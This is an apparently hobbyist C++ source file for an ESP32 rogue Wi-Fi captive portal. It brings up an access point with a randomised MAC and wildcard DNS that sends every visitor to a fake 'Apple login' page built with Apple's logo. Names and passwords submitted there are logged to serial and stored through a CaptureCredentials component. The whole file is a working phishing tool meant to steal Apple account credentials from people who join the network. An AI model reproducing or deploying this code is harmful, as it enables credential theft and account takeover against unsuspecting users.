#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "CaptivePortal.h"
#include <string>
#include <esp_wifi.h>
#include <CaptureCredentials.h>

CaptureCredentials captureCredentials;
DNSServer dnsServer;
AsyncWebServer server(80);

String input_username;
String input_password;
String portal_SSID;
String portal_ID;
bool username_received = false;
bool password_received = false;

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html><head>
  <title>Captive Portal Demo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
    *, *:before, *:after {
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: black;
      color: white;
      padding: 20px;
    }

    input {
      padding: 5px;
      margin: 5px;
      width: 200px;
      background: black;
      border: white 1px solid;
      outline: none;
      border-radius: 3px;
    }

    svg {
      fill: white;
    }
  </style>
  </head><body>
  <h3>Apple login</h3>
  <svg xmlns="http://www.w3.org/2000/svg" width="0.82em" height="1em" viewBox="0 0 256 315"><path d="M213.803 167.03c.442 47.58 41.74 63.413 42.197 63.615c-.35 1.116-6.599 22.563-21.757 44.716c-13.104 19.153-26.705 38.235-48.13 38.63c-21.05.388-27.82-12.483-51.888-12.483c-24.061 0-31.582 12.088-51.51 12.871c-20.68.783-36.428-20.71-49.64-39.793c-27-39.033-47.633-110.3-19.928-158.406c13.763-23.89 38.36-39.017 65.056-39.405c20.307-.387 39.475 13.662 51.889 13.662c12.406 0 35.699-16.895 60.186-14.414c10.25.427 39.026 4.14 57.503 31.186c-1.49.923-34.335 20.044-33.978 59.822M174.24 50.199c10.98-13.29 18.369-31.79 16.353-50.199c-15.826.636-34.962 10.546-46.314 23.828c-10.173 11.763-19.082 30.589-16.678 48.633c17.64 1.365 35.66-8.964 46.64-22.262"/></svg>
  <p>Enter your Apple ID and password</p>
  <form action="/get">
    <p>
    <label>AppleId / email: <input type="email" name="email"></label>
    </p>
    <p>
    <label>Password: <input type="password" /> </label>
    </p>
    <input type="submit" value="Submit">
  </form>
</body></html>)rawliteral";

bool CaptiveRequestHandler::canHandle(AsyncWebServerRequest *request)
{
  // request->addInterestingHeader("ANY");
  return true;
}

void CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request)
{
  request->send_P(200, "text/html", index_html);
}

CaptivePortal::CaptivePortal()
{
}

CaptivePortal::~CaptivePortal()
{
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
}

bool CaptivePortal::start()
{
  // your other setup stuff...
  Serial.println();
  Serial.println("Setting up AP Mode");
  if (!this->macAddress)
  {
    this->randomizeMacAddress();
  }
  esp_base_mac_addr_set(this->macAddress);
  WiFi.mode(WIFI_AP);
  WiFi.setTxPower(this->power);
  WiFi.softAPsetHostname(this->hostname.c_str());

  if (!WiFi.softAPConfig(this->IP, this->gateway, this->subnet))
  {
    Serial.println("Failed to configure the AP");
    return false;
  }

  if (!WiFi.softAP(this->SSID, this->password, this->channel, this->hidden, this->max_connection))
  {
    Serial.println("Failed to start the AP");
    return false;
  }

  portal_ID = this->portalId;
  portal_SSID = this->SSID;
  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  this->setupServer();

  Serial.println("Starting DNS Server");
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); // only when requested from AP
  // more handlers...
  server.begin();
  Serial.println("All Done!");
  this->active = true;
  captureCredentials.initScreen();
  return true;
}

void CaptivePortal::stop()
{
  dnsServer.stop();
  server.end();
  WiFi.mode(WIFI_AP);
  WiFi.enableAP(false);
  WiFi.softAPdisconnect(true);
  this->active = false;
  captureCredentials.offScren();
};

void CaptivePortal::restart(bool restart)
{
  if (restart)
  {
    this->stop();
    this->start();
  }
}

void CaptivePortal::setupServer()
{
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    request->send_P(200, "text/html", index_html);
    Serial.println("Client Connected"); });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request)
            {
    String inputMessage;
    String inputParam;
    String username_;
    String password_;

    if (request->hasParam("email"))
    {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      username_ = inputMessage;
      input_username = inputMessage;
      Serial.println(inputMessage);
      username_received = true;
    }

    if (request->hasParam("password"))
    {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      input_password = inputMessage;
      password_ = inputMessage;
      Serial.println(inputMessage);
      password_received = true;
    }

    Serial.println("Before storeCaptive");
    captureCredentials.storeCaptive(portal_SSID, portal_ID, username_, password_); 
    Serial.println("After storeCaptive");
    delay(100);
    request->send(200, "text/html", "The values entered by you have been successfully sent to the device <br><a href=\"/\">Return to Home Page</a>"); });
}

void CaptivePortal::listenAndHandleRequests()
{
  if (!this->active)
  {
    return;
  }

  dnsServer.processNextRequest();
  if (username_received && password_received)
  {
    Serial.print("Hello: ");
    Serial.println(input_username);
    Serial.print("You have stated your password_received to be: ");
    Serial.println(password);
    username_received = false;
    password_received = false;
    Serial.println("We'll wait for the next client now");
  }
}

void CaptivePortal::setSSID(String SSID, bool restart)
{
  this->SSID = SSID;
  this->restart(restart);
}

void CaptivePortal::setPortalId(String setPortalId, bool restart)
{
  this->SSID = setPortalId;
  this->restart(restart);
}

void CaptivePortal::setHostname(String hostname, bool restart)
{
  this->hostname = hostname;
  this->restart(restart);
}

void CaptivePortal::setMacAddress(uint8_t macAddress[6], bool restart)
{
  memcpy(this->macAddress, macAddress, 6);
  this->restart(restart);
}

void CaptivePortal::setPassword(String password, bool restart)
{
  this->password = password;
  this->restart(restart);
}

void CaptivePortal::setRequestPassword(bool requestPassword, bool restart)
{
  this->requestPassword = requestPassword;
  this->restart(restart);
}

void CaptivePortal::setIP(IPAddress IP, bool restart)
{
  this->IP = IP;
  this->restart(restart);
}

void CaptivePortal::setGateway(IPAddress gateway, bool restart)
{
  this->gateway = gateway;
  this->restart(restart);
}

void CaptivePortal::setSubnet(IPAddress subnet, bool restart)
{
  this->subnet = subnet;
  this->restart(restart);
}

void CaptivePortal::setChannel(int channel, bool restart)
{
  this->channel = channel;
  this->restart(restart);
}

void CaptivePortal::setHidden(bool hidden, bool restart)
{
  this->hidden = hidden;
  this->restart(restart);
}

void CaptivePortal::setMaxConnection(int max_connection, bool restart)
{
  this->max_connection = max_connection;
  this->restart(restart);
}

void CaptivePortal::setPower(WIFI_POWER power, bool restart)
{
  this->power = static_cast<wifi_power_t>(power);
  this->restart(restart);
}

void CaptivePortal::randomizeMacAddress(bool restart)
{
  uint8_t mac[6];
  for (int i = 0; i < 6; i++)
  {
    mac[i] = random(0, 256);
  }
  this->setMacAddress(mac, restart);
}
